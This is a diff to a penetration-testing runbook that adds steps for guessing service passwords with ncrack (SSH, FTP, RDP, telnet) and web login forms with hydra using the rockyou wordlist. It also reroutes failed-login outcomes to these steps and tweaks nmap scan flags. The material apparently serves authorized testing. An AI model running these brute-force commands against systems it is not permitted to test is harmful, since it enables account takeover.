@@ -75,10 +75,10 @@ ping -c 3 '<TARGET_IP>'
 Enter when: the box responds, or you have decided to scan anyway.
 
 ```bash
-sudo nmap -sC -sV -p- -v -T4 -oN results.txt '<TARGET_IP>'
+sudo nmap -sS -sVC -p- -v -T4 --open -oN results.txt '<TARGET_IP>'
 ```
 
-If sudo is unavailable, use `nmap -sT -sC -sV -p- -v -T4 -oN results.txt '<TARGET_IP>'`. If discovery wrongly reports the host down, retry once with `-Pn`.
+If sudo is unavailable, use `nmap -sT -sVC -p- -v -T4 --open -oN results.txt '<TARGET_IP>'`. If discovery wrongly reports the host down, retry once with `-Pn`.
 
 | Result | Next |
 | --- | --- |
@@ -174,7 +174,7 @@ If the server requires TLS, use **FTP-04** instead.
 | Result | Next |
 | --- | --- |
 | Listing returned | **FTP-02**. A listing is not file access. |
-| Login denied | **NET-05**. |
+| Login denied | **PASS-03** against `ftp://`, or **NET-05** when no username is suspected. |
 | Login works, listing or data channel fails | Check the route at **NET-01**, then **NET-05**. |
 | Writable directory and write test permitted | **FTP-03**. |
 | TLS required | **FTP-04**. |
@@ -259,12 +259,12 @@ Enter when: SSH answered.
 ssh-keyscan -T 5 -p <SSH_PORT> <TARGET_IP>
 ```
 
-Compare the host key with anything already pinned. If one account is supplied, go straight to **SSH-02**; do not spray guessed users.
+Compare the host key with anything already pinned. If one account is supplied, go straight to **SSH-02**; with no account, **PASS-03** is the guess route. Do not spray when a working supplied account exists.
 
 | Result | Next |
 | --- | --- |
 | Endpoint answers, key unchanged, account supplied | **SSH-02**. |
-| Endpoint answers, no account | **NET-05**; SSH stays a blocked prerequisite. |
+| Endpoint answers, no account | **PASS-03** against `ssh://`; SSH stays a blocked prerequisite. |
 | Pinned key changed | **PAUSE-ROUTE** until explained. |
 | Port closed but a knock sequence was read | **SSH-03**. |
 | Connection fails before key exchange | **NET-03**. |
@@ -287,7 +287,7 @@ hostname; id; uname -s
 | --- | --- |
 | Linux host and identity confirmed | **LNX-01** in this shell. |
 | Windows host and identity confirmed | **WIN-01** in this shell. |
-| Login denied | Record it; **NET-05**. |
+| Login denied | **PASS-03** against `ssh://` with that name, or **NET-05** when no username is suspected. |
 | Logged in but host or identity unverified | **EXP-03**. |
 
 # http
@@ -388,7 +388,7 @@ Keep the captured method, content type and every required field. JSON or multipa
 | Nothing changes | **NET-05**, or **WEB-04** if discovery is unfinished. |
 | Upload function observed | **WEB-10**. |
 | Stored create/update with a delete route | **WSTORE-01**. |
-| Required account observed | **WEB-09**. |
+| Required account observed | **WEB-09**; a login form goes to **PASS-04**. |
 | POSIX argument, file read or SQL context | **WEXEC-01** / **WREAD-01** / **WSQL-01**. |
 | Anomaly | **GAP-WEB-INPUT**. |
 | JSON body | **WEB-26**. |
@@ -435,7 +435,7 @@ Sign in through the UI, confirm the account and origin, then open one account-on
 | Result | Next |
 | --- | --- |
 | Account-only function works | **WEB-06**, **WEB-08** or **WEB-10**. |
-| No permitted account | **WEB-01** or **NET-05**. |
+| No permitted account | **PASS-04** on the observed login form, then **WEB-01**. |
 | Login redirect or expired session | Resolve sign-in first. |
 | Identity confirmed but function denied | Record the boundary; **WEB-01**. |
 
@@ -1587,7 +1587,7 @@ KRB5CCNAME='administrator.ccache' impacket-psexec -k -no-pass '<DOMAIN>/administ
 | Ticket mismatch | **PAUSE-COVERAGE**. |
 # password_attacks
 
-Spray and crack one credential source at a time.
+Spray, guess or crack one credential source at a time.
 
 ## PASS-01. Can one password be sprayed safely?
 
@@ -1628,6 +1628,63 @@ hashcat -m 7300 '<IPMI_HASH>' /usr/share/wordlists/rockyou.txt
 `--show` lists recovered values; delete the hash file when done.
 | Wrong mode | **hashid** output again; do not try every mode. |
 | NTLM used directly | Pass-the-hash at **AD-03** with `-H`. |
+
+## PASS-03. Can one observed service account be guessed from a short list?
+
+Enter when: **SSH-01**, **FTP-01** or another service check answered but supplied no usable credential, and a likely username or short user list exists.
+
+Start with the known suspicious account and one list; stop at the first success:
+
+```bash
+ncrack --user '<USERNAME>' -P /usr/share/wordlists/rockyou.txt -f -v '<SERVICE>://<TARGET_IP>'
+```
+
+For a short user list, keep the same password list:
+
+```bash
+ncrack -U users.txt -P /usr/share/wordlists/rockyou.txt -f -v '<SERVICE>://<TARGET_IP>'
+```
+
+For both lists, use the collected accounts and passwords:
+
+```bash
+ncrack -U users.txt -P passwords.txt -f -v '<SERVICE>://<TARGET_IP>'
+```
+
+Replace `<SERVICE>` with the observed protocol: `ssh`, `ftp`, `rdp` or `telnet`. Add the port as `'ssh://<TARGET_IP>:<PORT>'` when it is non-standard.
+
+| Result | Next |
+| --- | --- |
+| Credential pair reported | The matching protocol check: **SSH-02**, **FTP-01**, **RDP-01** or **DB-01**. |
+| Every pair in the list fails | **NET-05**; the list is exhausted, not the service. |
+| Lockout risk on a domain account | Read the policy at **PASS-01** before a larger list. |
+| Connection refused or protocol error | **NET-03** to confirm the port and scheme. |
+
+## PASS-04. Can a web login form be guessed with hydra?
+
+Enter when: **WEB-08** captured a login POST and its failure response.
+
+Confirm the exact path, field names and failure string with a known-bad pair first:
+
+```bash
+hydra -l test -p test '<TARGET_IP>' http-post-form '<PATH>:<USER_FIELD>=^USER^&<PASS_FIELD>=^PASS^:F=<FAILURE_TEXT>' -vV
+```
+
+Then guess one known or suspected username:
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt '<TARGET_IP>' http-post-form '<PATH>:<USER_FIELD>=^USER^&<PASS_FIELD>=^PASS^:F=<FAILURE_TEXT>' -vV
+```
+
+Supply `-s <PORT>` for a non-standard port and `-S` for HTTPS. Add `-t 16` only after the single-threaded attempt reports correctly; lower it again on 429 or timeouts. Add `-f` to stop at the first pair.
+
+| Result | Next |
+| --- | --- |
+| `login:` and `password:` lines | **WEB-09** with that account. |
+| Every attempt reported as failure | The failure string is wrong; recapture the rejection at **WEB-08**. |
+| 429 or timeouts | Retry once with a lower `-t`; then **PAUSE-COVERAGE**. |
+| List exhausted, form correct | **PAUSE-COVERAGE**; record the list and failure string. |
+| CSRF token or JavaScript-built body | Use Burp Intruder instead; **WEB-08**. |
 # redis
 
 ## REDIS-01. Does this Redis endpoint permit the intended connection?
@@ -6100,6 +6157,14 @@ The lockout policy decides how many attempts are safe.
 ## PASS-02. What decides this step?
 
 Identify the hash before choosing a hashcat mode.
+
+## PASS-03. What decides this step?
+
+The observed protocol and one short credential source decide the attempt. `-f` ends the list at the first accepted pair for that service; `-v` shows progress. A completed list proves only that this list failed. Lockout policy still rules a domain account, so read it at PASS-01 before sending many candidates.
+
+## PASS-04. What decides this step?
+
+The failure condition decides whether hydra can tell success from failure. `F=` matches text present on a failed login; if the page renders the same text on success, every attempt looks wrong. Confirm one known-bad pair before the real list. A 429 or timeout is a concurrency result, not a wrong password.
 
 
 ## REDIS-01. What decides this step?
